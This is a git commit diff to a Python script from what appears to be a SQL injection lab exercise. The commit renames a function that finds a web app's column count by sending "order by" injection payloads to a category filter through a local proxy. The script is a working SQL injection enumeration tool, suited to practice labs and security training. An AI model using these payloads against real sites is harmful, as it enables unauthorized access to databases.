88e4046bc767dbeadb458c0d0398a44c0d6ffca5
Michael Byrd <iamtron01@hotmail.com>
2024-06-04 16:22:49 -0500

    renamed variable and method

--- sql-injection/sqli-lab-03.py
+++ sql-injection/sqli-lab-03.py
@@ -8,7 +8,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def exploit_sqli_column_number(url):
+def get_exploit_column_number(url):
     path = "filter?category=Gifts"
     for number in range(1,50):
         payload = "'+order+by+%s--" %number
@@ -24,8 +24,8 @@ if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
         print("[+] Figuring out number of columns...")
-        num_col = exploit_sqli_column_number(url)
-        print("[+] The number of columns is " + str(num_col) + "." )
+        column_number = get_exploit_column_number(url)
+        print("[+] The number of columns is " + str(column_number) + "." )
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
